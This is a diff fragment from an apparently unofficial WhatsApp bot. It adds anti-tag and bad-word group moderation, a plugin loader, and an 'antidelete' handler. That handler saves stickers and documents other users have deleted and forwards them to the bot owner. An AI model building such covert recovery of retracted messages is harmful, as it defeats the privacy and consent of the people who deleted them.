+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Sticker]`;
+            const buffer = await daveInstance.downloadMediaMessage(
+              originalMessage
+            );
+            await daveInstance.sendMessage(daveInstance.user.id, {
+              sticker: buffer,
+              contextInfo: {
+                externalAdReply: {
+                  title: notificationText,
+                  body: `DELETED BY : ${deletedByFormatted}`,
+                  thumbnail: trashpic,
+                  sourceUrl: "",
+                  mediaType: 1,
+                  renderLargerThumbnail: false,
+                },
+              },
+            });
+          } else if (originalMessage.message?.documentMessage) {
+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Document]`;
+            const docMessage = originalMessage.message.documentMessage;
+            const fileName = docMessage.fileName || `document_${Date.now()}.dat`;
+            console.log("Attempting to download document...");
+            const buffer = await daveInstance.downloadMediaMessage(
+              originalMessage
+            );
+
+            if (!buffer) {
+              console.log("Download failed - empty buffer");
+              notificationText += " (Download Failed)";
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                text: notificationText,
+              });
+              return;
+            }
+
+            console.log("Sending document back...");
+            await daveInstance.sendMessage(daveInstance.user.id, {
+              document: buffer,
+              fileName: fileName,
+              mimetype: docMessage.mimetype || "application/octet-stream",
+              contextInfo: {
+                externalAdReply: {
+                  title: notificationText,
+                  body: `DELETED BY: \n\n ${deletedByFormatted}`,
+                  thumbnail: trashpic,
+                  sourceUrl: "",
+                  mediaType: 1,
+                  renderLargerThumbnail: true,
+                },
+              },
+            });
+          }
+        } catch (error) {
+          console.error("Error handling deleted message:", error);
+          notificationText += `\n\n⚠️ Error recovering deleted content 😓`;
+          await daveInstance.sendMessage(daveInstance.user.id, {
+            text: notificationText,
+          });
+        }
+      } catch (error) {
+        console.error("Error in handleMessageRevocation:", error);
+      }
+    }
+
+    if (antidel === "TRUE") {
+      if (m.message?.protocolMessage?.key) {
+        await handleMessageRevocation(dave, m);
+      } else {
+        handleIncomingMessage(m);
+      }
+    }
+
+    ///////////end bug func///////////
+
+    // AntiTag System - Testing without DB
+    if (isGroup && global.antitag && global.antitag[from]) {
+      const groupMeta = await dave.groupMetadata(from);
+      const groupAdmins = groupMeta.participants
+        .filter((p) => p.admin)
+        .map((p) => p.id);
+      const botNumberFull = dave.user.id.split(":")[0] + "@s.whatsapp.net";
+      const isBotAdmin = groupAdmins.includes(botNumberFull);
+      const isSenderAdmin = groupAdmins.includes(m.sender);
+
+      const mentionedUsers =
+        m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+
+      if (mentionedUsers.length > 0) {
+        if (!isSenderAdmin && isBotAdmin) {
+          try {
+            await dave.sendMessage(from, { delete: m.key });
+            await dave.sendMessage(from, {
+              text: `Yooh! Tagging others is not allowed!\nUser: @${m.sender.split("@")[0]}`,
+              mentions: [m.sender],
+            });
+            await dave.groupParticipantsUpdate(from, [m.sender], "remove");
+          } catch (err) {
+            console.error("AntiTag Enforcement Error:", err);
+          }
+        }
+      }
+    }
+
+    // AntiBadWord System - Testing without DB
+    if (isGroup && global.antibadword && global.antibadword[from]) {
+      const badwords = global.badwordsList || ["badword1", "badword2"]; // test words
+      const textMsg = (m.body || "").toLowerCase();
+      const found = badwords.find((w) => textMsg.includes(w));
+
+      if (found) {
+        const botNumberFull = dave.user.id.split(":")[0] + "@s.whatsapp.net";
+        const groupMetadata = await dave.groupMetadata(from);
+        const groupAdmins = groupMetadata.participants
+          .filter((p) => p.admin)
+          .map((p) => p.id);
+        const isBotAdmin = groupAdmins.includes(botNumberFull);
+        const isSenderAdmin = groupAdmins.includes(m.sender);
+
+        if (!isSenderAdmin && isBotAdmin) {
+          await dave.sendMessage(from, { delete: m.key });
+          await dave.sendMessage(from, {
+            text: `@${m.sender.split("@")[0]} has been kicked for using bad word: ${found}`,
+            mentions: [m.sender],
+          });
+          await dave.groupParticipantsUpdate(from, [m.sender], "remove");
+        }
+      }
+    }
+
+    if (!dave.isPublic && !daveshown) {
+      return; // ignore all messages from non-owner when in private mode
+    }
+
+    const example = (teks) => {
+      return `\n *invalid format!*\n`;
+    };
+    const menu = require("./library/listmenu/menulist");
+    /////////////plugins commands/////////////
+    const pluginsLoader = async (directory) => {
+      let plugins = [];
+      const folders = fs.readdirSync(directory);
+      folders.forEach((file) => {
+        const filePath = path.join(directory, file);
+        if (filePath.endsWith(".js")) {
+          try {
+            const resolvedPath = require.resolve(filePath);
+            if (require.cache[resolvedPath]) {
+              delete require.cache[resolvedPath];
+            }
+            const plugin = require(filePath);
+            plugins.push(plugin);
+          } catch (error) {
+            console.log(`Error loading plugin at ${filePath}:`, error);
+          }
+        }
+      });
+      return plugins;
+    };
+
+    //========= [ COMMANDS PLUGINS ] =================================================
+    let pluginsDisable = true;
+    const plugins = await pluginsLoader(path.resolve(__dirname, "daveplugins"));
+    const trashdex = {
+      daveshown,
+      reply,
+      replymenu,
+      command,
+      isCmd,
+      text,
+      botNumber,
+      prefix,
+      reply,
+      fetchJson: fetchJsonLib,
+      example,
+      totalfeature,
+      dave,
+      m,
+      q,
+      mime,
+      sleep,
+      fkontak,
+      addPremiumUser,
+      args,
+      delPremiumUser,
+      isPremium,
+      trashpic,
+      trashdebug,
+      sleep,
+      isAdmins,
+      groupAdmins,
+      isBotAdmins,
+      quoted,
+      from,
+      groupMetadata,
+      downloadAndSaveMediaMessage,
+      heaven,
+      menu,
+      loading,
+      quotedMessage,
+    };
+    for (let plugin of plugins) {
+      if (plugin.command && plugin.command.find((e) => e == command)) {
+        pluginsDisable = false;
+        if (typeof plugin !== "function") return;
+        await plugin(m, trashdex);
+      }
+    }
+    if (!pluginsDisable) return;
+
+    switch (command) {
 case 'script':
 case 'repo': {
   const botInfo = `
